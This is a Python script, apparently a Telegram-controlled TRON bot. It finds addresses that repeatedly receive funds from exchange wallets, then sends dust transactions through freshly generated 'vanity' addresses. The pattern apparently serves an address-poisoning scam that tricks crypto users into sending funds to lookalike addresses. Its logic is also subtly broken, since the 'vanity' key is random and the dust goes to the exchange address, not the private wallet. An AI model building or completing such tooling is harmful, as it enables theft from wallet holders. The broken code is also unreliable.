import os
import time
import requests
from datetime import datetime, timedelta, timezone
from tronpy import Tron
from tronpy.keys import PrivateKey

# =========================
# 🟢 SETTINGS
# =========================
TARGET_PAIRS = 5
CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']

# =========================
# 1. LOAD SECRETS
# =========================
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
TRONSCAN_API_KEY = os.environ.get("TRONSCAN_API_KEY")
PRIVATE_KEY = os.environ.get("PRIVATE_KEY")

if not all([TELEGRAM_BOT_TOKEN, CHAT_ID, TRONSCAN_API_KEY, PRIVATE_KEY]):
    raise Exception("Missing Secrets!")

print("✅ Secrets loaded!")
tron = Tron()
TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

# =========================
# 2. TELEGRAM
# =========================
def send_telegram(message):
    try:
        requests.post(f"{TELEGRAM_URL}/sendMessage", json={
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }, timeout=10)
    except: pass

# =========================
# 3. GET TRANSFERS (WORKING ENDPOINT)
# =========================
def get_transfers():
    headers = {"TRON-PRO-API-KEY": TRONSCAN_API_KEY}
    try:
        r = requests.get("https://apilist.tronscanapi.com/api/transfer", 
                        params={"start": 0, "limit": 100},
                        headers=headers, timeout=30)
        return r.json().get("data", [])
    except:
        return []

# =========================
# 4. CHECK IF CEX
# =========================
def is_cex(address):
    try:
        headers = {"TRON-PRO-API-KEY": TRONSCAN_API_KEY}
        r = requests.get(f"https://apilist.tronscanapi.com/api/account",
                        params={"address": address},
                        headers=headers, timeout=10)
        data = r.json()
        tags = " ".join(data.get("tags", [])).lower()
        name = (data.get("accountName") or "").lower()
        
        for keyword in CEX_KEYWORDS:
            if keyword in tags or keyword in name:
                return True, keyword.capitalize()
        return False, None
    except:
        return False, None

# =========================
# 5. MAIN
# =========================
def main():
    print("🚀 Starting simple scanner...")
    send_telegram("🚀 <b>Scanner Started</b>\nFinding CEX → Private wallet pairs...")
    
    found = []
    checked = set()
    
    while len(found) < TARGET_PAIRS:
        transfers = get_transfers()
        print(f"Got {len(transfers)} transfers")
        
        # Group by receiver
        receivers = {}
        for tx in transfers:
            to_addr = tx.get("to_address")
            from_addr = tx.get("from_address")
            
            if to_addr and from_addr:
                if to_addr not in receivers:
                    receivers[to_addr] = []
                receivers[to_addr].append(from_addr)
        
        # Find patterns
        for wallet_b, senders in receivers.items():
            if len(found) >= TARGET_PAIRS:
                break
            if wallet_b in checked:
                continue
            
            # Count sends
            counts = {}
            for s in senders:
                counts[s] = counts.get(s, 0) + 1
            
            # Find 2+ from same sender
            for sender, count in counts.items():
                if count >= 2:
                    cex, name = is_cex(sender)
                    if cex:
                        checked.add(wallet_b)
                        found.append({"a": sender, "b": wallet_b, "name": name})
                        send_telegram(f"✅ <b>Pair {len(found)}/{TARGET_PAIRS}</b>\n🏦 {name}: <code>{sender[:20]}...</code>\n👤 Private: <code>{wallet_b[:20]}...</code>")
                    break
        
        if len(found) < TARGET_PAIRS:
            time.sleep(3)
    
    # Interactive
    send_telegram(f"🎯 <b>Found {len(found)} pairs!</b>\nType <b>info</b> or <b>transfer</b>")
    
    last_id = 0
    go = False
    
    while not go:
        updates = requests.get(f"{TELEGRAM_URL}/getUpdates", 
                              params={"offset": last_id, "timeout": 30}).json().get("result", [])
        
        for u in updates:
            last_id = u["update_id"]
            if u.get("message") and str(u["message"]["chat"]["id"]) == str(CHAT_ID):
                text = u["message"].get("text", "").strip()
                
                if text == "info":
                    msg = "\n\n".join([f"{i+1}. {p['name']} → {p['b']}" for i, p in enumerate(found)])
                    send_telegram(f"📋 <b>Pairs:</b>\n\n{msg}")
                
                elif text == "transfer":
                    go = True
                    break
        
        if not go:
            time.sleep(5)
    
    # Execute
    send_telegram("🚀 <b>Executing transfers...</b>")
    
    for i, pair in enumerate(found):
        try:
            # Generate vanity
            key = PrivateKey.random()
            vanity = key.public_key.to_base58check_address()
            
            # Main → Vanity
            priv = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', '')))
            tx1 = tron.trx.transfer(priv.public_key.to_base58check_address(), vanity, 1).build().sign(priv).broadcast().txid
            
            time.sleep(3)
            
            # Vanity → Wallet A
            priv2 = PrivateKey(bytes.fromhex(key.hex()))
            tx2 = tron.trx.transfer(key.public_key.to_base58check_address(), pair["a"], 1).build().sign(priv2).broadcast().txid
            
            send_telegram(f"✅ <b>#{i+1} Done</b>\nTX1: <code>{tx1}</code>\nTX2: <code>{tx2}</code>")
        except Exception as e:
            send_telegram(f"❌ Error: {e}")
        
        time.sleep(5)
    
    send_telegram("✅ <b>All done!</b>")

if __name__ == "__main__":
    main()
